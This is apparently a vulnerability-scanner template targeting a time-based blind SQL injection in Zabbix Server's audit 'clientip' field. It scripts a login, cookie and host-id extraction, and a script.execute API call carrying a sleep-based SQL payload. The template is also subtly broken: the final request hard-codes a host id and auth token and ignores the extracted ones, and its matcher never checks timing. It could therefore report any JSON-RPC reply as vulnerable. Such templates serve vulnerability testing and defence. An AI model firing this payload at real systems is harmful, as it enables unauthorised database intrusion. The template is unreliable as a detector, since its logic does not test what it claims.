id: zabbix-server-time-based-sqli

info:
  name: Zabbix Server Time-Based SQL Injection
  author: Christopher Calvani
  severity: high
  description: |
    Zabbix server can perform command execution for configured scripts. After a command is executed, an audit entry is added to "Audit Log". Due to the "clientip" field not being sanitized, it is possible to inject SQL into "clientip" and exploit time-based blind SQL injection.

variables:
  username: "your_username"
  password: "your_password"

http:
  - method: POST
    path:
      - "{{BaseURL}}/zabbix/index.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
        name={{username}}&password={{password}}&autologin=1&enter=Sign+in
    extractors:
      - type: regex
        name: zbx_session
        part: header
        internal: true
        regex:
          - '(zbx_session)=([^;]+)'

  - method: POST
    path: 
      - "{{BaseURL}}/zabbix/zabbix.php?action=dashboard.view"
    extractors:
      - type: regex
        name: hostid
        part: body
        internal: true
        regex:
          - '(hostid):"(\d+)"'

  - method: POST
    path:
      - "{{BaseURL}}/zabbix/api_jsonrpc.php"
    headers:
      Content-Type: application/json
    body: |
      {
        "jsonrpc": "2.0",
        "method": "script.execute",
        "params": {
          "scriptid": "3",
          "hostid": "10084",
          "clientip": "' + (select sleep(10)) + '"
        },
        "auth": "58c5c938102abbb5a6cc573e33d46a91",
        "id": 1
      }
    matchers:
      - type: word
        words:
          - '"jsonrpc":"2.0"'
